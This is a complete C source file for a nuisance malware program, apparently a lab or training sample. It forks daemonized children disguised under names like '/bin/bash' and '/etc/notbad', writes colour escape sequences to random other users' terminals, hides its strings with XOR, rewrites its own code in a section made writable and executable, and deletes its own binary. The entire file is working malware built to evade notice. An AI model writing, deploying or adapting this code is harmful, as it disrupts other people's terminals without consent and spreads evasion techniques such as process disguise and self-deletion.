#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/mman.h>

#define XORLIT(lit)	(xorstr(lit, sizeof(lit)))
#define CLEARXORSTR()	(XORLIT(""))

#define XORPRINTF(fmt, ...)	(printf(XORLIT(fmt), ##__VA_ARGS__))
#define XORKEY			{0x41, 0x43, 0x54, 0x50}
// WARNING! You can only have 1 XORSTR in play at a time, it will wipe the last one out
static inline char* xorstr(char* ciphr, size_t clen) {
	static char* xstr = NULL;
	static size_t xstrSz = 0;

	uint8_t key[] = XORKEY;
	size_t i = 0;

	if (xstr != NULL) {
		memset(xstr, '\0', xstrSz);
		free(xstr);
		xstr = NULL;
	}

	if (clen <= 1) {
		return NULL;
	}

	xstr = (char*)malloc(clen);

	memcpy(xstr, ciphr, clen);
	
	for (i = 0; i < (clen-1); i++) {
		xstr[i] = xstr[i] ^ key[i % sizeof(key)];
	}

	return xstr;
}

#define MAXPTS	0x40
#define MAXPATH 0x100

int openrandpts() {
	DIR *dp;
	struct dirent *ep;
	int fd = -1;
	int num = 0;
	int list[MAXPTS];
	int listcount = 0;
	char fname[MAXPATH] = {0};
	char* outptr = NULL;

	dp = opendir(XORLIT("/dev/pts/"));
	if (dp != NULL)
	{
		while ((ep = readdir(dp)) != NULL) {
			if (strchr(ep->d_name, '.')) {
				continue;
			}

			errno = 0;			
			num = strtol(ep->d_name, &outptr, 10);
			if (errno != 0 || outptr == ep->d_name) {
				continue;
			}

			list[listcount] = num;
			listcount++;
			if (listcount >= MAXPTS) {
				break;
			}
		}

		(void)closedir (dp);

		if (listcount > 0) {
			//choose a random one!
			num = rand() % listcount;
			
			snprintf(fname, MAXPATH-1, XORLIT("/dev/pts/%d"), list[num]);
			fd = open(fname, O_WRONLY);
		}
	}

	return fd;
}

#define COLORS	XORLIT("0123456")
#define CFMT	XORLIT("\x1b[3%c;4%cm :) \n")

void colorit(int fd) {
	int choice = rand() % (sizeof(COLORS)-1);
	if (fd == -1) {
		printf(CFMT, COLORS[choice], COLORS[choice]);
	} else {
		dprintf(fd, CFMT, COLORS[choice], COLORS[choice]);
	}
}

#define MINSLEEP	3
#define MAXSLEEP	30

void colorloop() {
	int rpts = -1;
	while (1) {
		sleep( MINSLEEP + (rand() % (MAXSLEEP - MINSLEEP)) );
		// get a random open /dev/pts
		rpts = openrandpts();
		colorit(rpts);
		if (rpts != -1) {
			close(rpts);
		}
	}
}

#define NUMSLEEPERS	6
#define BINNAME0	XORLIT("./nothing")
#define BINNAME1	XORLIT("/bin/nice")
#define BINNAME2	XORLIT("~/.i/am/a/goodguy")
#define BINNAME3	XORLIT("/etc/notbad")
#define BINNAME4	XORLIT("/bin/bash")
#define BINNAME5	XORLIT("jordan")
#define NUMNAMES	6

// put in custom section so we know it's start/stop
__attribute((__section__("malleable")))
void causeloops(char* path) {
	// this funciton gets bswapped by a build step	
	
	int i;
	char* name;
	pid_t p;

	for (i=0; i < NUMSLEEPERS; i++) {
		p = fork();
		if (p == 0) {
			srand(getpid());
			setsid();
			switch (rand() % NUMNAMES) {
			case 0: name = BINNAME0; break;
			case 1: name = BINNAME1; break;
			case 2: name = BINNAME2; break;
			case 3: name = BINNAME3; break;
			case 4: name = BINNAME4; break;
			case 5: name = BINNAME5; break;
			}
			execl(path, name, NULL);
		}
	}
}
// end custom section of rwx code
__attribute((__section__(".text")))

// in asm file
extern void domodify(char*, char*);

// linker exposes these variables for us to use our custom section
extern const char* __start_malleable;
extern const char* __stop_malleable;

void fixcauseloops() {
	void* start = (void*)&__start_malleable;
	void* end = (void*)&__stop_malleable;

	void* astart = (void*)(((uint64_t)start) & (~0xfff));

	mprotect(astart, end - astart, PROT_READ|PROT_WRITE|PROT_EXEC); 
	domodify(start, end);
}

#define EXPECTED_NAME	XORLIT("badwhere")

int main(int argc, char* argv[]) {
	(void)argc;

	srand(getpid());

	if (strstr(argv[0], EXPECTED_NAME) == NULL) {
		// we got execd as something else, so do annoying color loops
		colorloop();
	}
	
	// color the terminal output unreadable
	colorit(-1);

	// here we could copy to a tmp file so they can't pkill all the children
	// Too mean?
	
	// fork off a bunch of annoying sleepers that do sleeps and colors in a loop
	fixcauseloops(); // first fix the self modifying code
	causeloops(argv[0]);

	// this can all be fixed with a pkill badwhere	
	
	printf(";)\n");


	// delete self after giving children a chance to run
	sleep(1);
	unlink(argv[0]);

	return 0;
}
